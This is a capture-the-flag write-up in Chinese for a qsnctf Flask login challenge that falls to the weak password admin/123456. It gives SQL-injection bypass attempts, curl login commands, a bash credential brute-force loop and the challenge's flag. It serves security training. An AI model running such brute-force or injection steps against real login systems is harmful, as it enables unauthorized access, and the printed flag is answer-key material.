# WP · qsnctf 40858「Flask 登录弱口令」

> 平台：qsnctf ｜ 题型：登录认证 / 弱口令爆破 ｜ 技术栈：Flask（Werkzeug）
> 入口：http://challenge.qsnctf.com:40858/login
> flag：`flag{8a086fc3735548bca68011a873f62d7f}`

---

## 0. 一句话思路

登录页 → 注册接口不存在、SQL 注入无效 → **弱口令爆破** → `admin/123456` 命中 → 302 跳 `/dashboard` → flag。

---

## 1. 信息收集

响应头暴露技术栈：`Server: Werkzeug/3.1.8 Python/3.12.13` → **Flask 应用**（Werkzeug 是 Flask 的 WSGI 服务器）。

页面是标准登录表单：`username` + `password` + `remember` 复选框。有个"注册"页签，但点不动（`class="tab inactive"`）。

CSS 泄露了一个重要情报：`/static/style.css` 里有 `.flag-box`、`.flag-label`、`.flag-box code` 这些类名——**登录成功后页面会有 flag 展示框**，说明这题就是"进后台"。

## 2. 排除常规路径

| 尝试 | 结果 | 结论 |
|---|---|---|
| GET/POST `/register` | 404 | 注册功能不存在，页签是装饰 |
| SQL 注入绕过（`' or 1=1--` 等 5 种） | 全部 `用户名或密码错误` | 后端参数化查询，注入无效 |
| JSON 登录 | 正常报错 | 无 JSON 接口差异 |
| 默认口令矩阵（admin/root/admin/123456...） | **`admin/123456` → 302** | 弱口令命中 |

## 3. 利用

```bash
# 登录（成功会 302 到 /dashboard 并下发 session cookie）
curl -i -c cc.txt -d "username=admin&password=123456" http://challenge.qsnctf.com:40858/login

# 带 cookie 访问 dashboard → flag
curl -b cc.txt http://challenge.qsnctf.com:40858/dashboard
```

响应关键部分：

```
HTTP/1.1 302 FOUND
Location: /dashboard
Set-Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.aoQhaQ.LxAIzrvtOz3D4HLyAzxWVqcadiI; HttpOnly; Path=/

<h1>欢迎回来，admin</h1>
<p class="success">登录成功
<code>flag{8a086fc3735548bca68011a873f62d7f}</code>
```

## 4. 关键判断技巧：怎么知道爆破成功

爆破登录题时，**看状态码/跳转**比看页面文字更靠谱：

- 失败 → 返回 **200**，页面带 `<p class="error">用户名或密码错误</p>`
- 成功 → 返回 **302**，`Location: /dashboard`

所以爆破脚本只要判断 `HTTP 状态码 == 302` 就是中了：

```bash
for u in admin root test; do
  for p in 123456 admin 12345678 password; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -d "username=$u&password=$p" URL/login)
    [ "$code" = "302" ] && echo "HIT: $u/$p"
  done
done
```

## 5. 知识点小结

| 点 | 说明 |
|---|---|
| 识别 Flask | 响应头 `Server: Werkzeug/...`、`Set-Cookie: session=...`（Flask session 三段式：payload.时间戳.签名） |
| Flask session | `eyJsb2dnZWRfaW4iOnRydWV9` base64 解码 = `{"logged_in":true}`——但改了也过不了签名校验，除非密钥泄露/可猜 |
| CSS 泄露 | 静态文件里的类名（`.flag-box`）能提前剧透"登录后有 flag" |
| 弱口令 | `admin/123456` 永远值得第一个试 |
| 爆破判据 | 302/跳转=成功，200+error=失败 |

> 关联工具：本地 `ctf-project\ctf_tools\wordlists\top1000弱口令爆破字典.txt`（配合 `ctf_tools\web_tools\login_brute.py` 使用），遇到没有弱口令的题可上字典爆。
